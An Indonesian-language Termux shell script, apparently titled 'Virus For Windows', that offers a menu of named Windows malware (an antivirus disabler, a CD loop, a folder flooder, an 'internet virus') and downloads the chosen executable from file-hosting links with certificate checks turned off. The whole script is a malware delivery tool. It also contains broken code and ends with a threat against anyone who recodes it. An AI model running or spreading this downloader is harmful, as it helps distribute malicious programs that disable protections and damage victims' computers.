#!/usr/bin/bash
#import sys os
pkg install figlet -y
pkg install toilet -y
pkg install wget -y
pkg install screenfetch neofetch -y
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
echo "<=====================================>"
screenfetch -A windows
echo "<=====================================>"
sleep 2
toilet -f graffiti.flf Virus For Windows
echo "<======================================>"
echo "1.> ANTIVIRUS_DISABLE"
echo "2.> CD_LOOP"
echo "3.> FOLDER_UNLIMITED"
echo "4.> Virus_Internet"
echo "0.> exit"
echo "<======================================>"
read -p "Choose-#" $code

if [ $code = 1 ] || [ $code = 1 ]
then
clear
apt update&&apt upgrade -y
pkg install wget -y
toilet -f graffiti.flf Downloading Virus --gay
wget --no-check-certificate https://www88.zippyshare.com/d/4rzWhAE8/243/ANTIVIRUS_DISABLE.exe
mv ANTIVIRUS_DISABLE.exe $HOME/F-Tools/Virus
echo "Done Cek Virus di folder Virus"
fi

if [ $code = 2 ] || [ $code = 2 ]
then
clear
apt update&&apt upgrade -y
pkg install wget -y
toilet -f graffiti.flf Downloading Virus --gay
wget --no-check-certificate https://www5.zippyshare.com/d/UljclC8I/927/CD_LOOP.exe
mv CD_LOOP.exe $HOME/F-Tools/Virus
echo "Done Cek Virus di folder Virus"
fi

if [ $code = 3 ] || [ $code = 3 ]
then
clear
apt update&&apt upgrade -y
pkg install wget -y
toilet -f graffiti.flf Downloading Virus --gay
wget --no-check-certificate https://www103.zippyshare.com/d/EJNyi8Tv/182/FOLDER_UNLIMITED.exe
mv FOLDER_UNLIMITED.exe $HOME/F-Tools/Virus
echo "Done Cek Virus di folder Virus"
fi

if [ $code = 4 ] || [ $code = 4 ]
then
clear
apt update&&apt upgrade -y
pkg install wget -y
toilet -f graffiti.flf Downloading Virus --gay
wget --no-check-certificate https://www111.zippyshare.com/d/BYASBjYk/273/Virus_Internet.exe
mv Virus_Internet.exe $HOME/F-Tools/Virus
fi

if [ $code = 0 ] || [ $code = 0 ]
then
sleep 2
echo "\033[34;1mTerimakasih Telah Menggunakan Tools ini"
sleep 2
echo "\033[34;1mRecode Gw Bacok Lo !!!!!!!"
exit
